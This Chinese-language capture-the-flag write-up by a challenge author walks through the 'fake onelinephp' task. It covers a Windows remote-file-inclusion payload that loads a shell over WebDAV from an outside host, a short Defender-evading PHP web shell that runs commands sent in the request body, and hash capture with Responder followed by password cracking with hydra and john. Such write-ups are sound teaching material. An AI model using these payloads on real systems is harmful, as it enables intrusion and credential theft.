### fake onelinephp

> 出题人：w1nd
> 考察点：windows远程文件包含 + 稍微免杀 + windows密码爆破

首先很抱歉题目开赛的时候就挂了，有的地方配置失误以及没想到请求量这么大，给师傅们谢罪了orz
题目做法设计的挺开放的，看师傅们做题过程也是十分有趣-w-

打开题目就是orange的one-line-php，这里的目的只是为了给一个文件包含的点，原题预期解的话是需要知道临时文件路径的，（不过真有师傅找到了orz

因为xx云会封smb，所以题目服务器开了webclient，启动一个webdav server，远程文件包含rce，payload:`http://fakeonelinephp.d3ctf.io/?orange=\\xx.xx.xx.xx\webdav\shell.php`
(看wp有的队伍用smb也成功了，emmm挠头.jpg

在远程文件包含的时候因为有windows defender会杀，所以要对shell稍微做一下免杀，免杀的方法很多，举个例子
```php
@<?php
system(file_get_contents("php://input"));?>
```
~~吐槽：师傅们高强度传马导致windows defender成为了服务器上CPU占用率最高的进程~~

进去发现web目录下只有index.php，webdav目录和.git目录，webdav是空的，只是想提示一下开了webclient，所以就剩下.git了。此处考察git使用，大黑阔们日常使用的git hack只能恢复出naive，用`git reflog` + `git reset` 恢复出~~两篇浮生日记~~hint2.txt和dict.txt
从0ops师傅那里学到了一个工具，能够直接恢复出来 https://github.com/gakki429/Git_Extract

hin2.txt
![](https://i.imgur.com/gXEQLrK.png)
dict.txt
![](https://i.imgur.com/WNWNRpe.png)

hint2.txt给出了flag的位置，在内网的机器上，给了密码字典，爆破一下就能拿到明文了，这一步也没有说什么唯一解，所以把几种解法都贴一下：

1. 丢hydra上去爆破
2. 转发出来爆破

看到师傅们基本都是前两种方法，其实在出题的时候想过限制爆破，但是多个队用的是同一套环境，有人搅屎的话就很蛋疼了，所以作罢

3. 拿hash用john爆破

这种方法毕竟动静比较小嘛

找个工具接收一下hash `python2 Responder.py -I eth0 -f`
![](https://i.imgur.com/et06TEx.png)
然后丢给john爆破一下就出来了
![](https://i.imgur.com/K0RCSAy.png)

有密码了rdp或者net use都可以啦

![](https://i.imgur.com/hr0yGi7.png)

Others：
在看wp的时候发现
![](https://i.imgur.com/2Jn7lDx.png)
这是因为前面做出来的队没有删ipc链接
其实我看到很多队伍传上来的工具都故意没有删，比如hydra，打包好的html.zip
不过感觉这样不太好，会对选手做题产生一些影响，比如有的师傅被假的html.zip骗了，，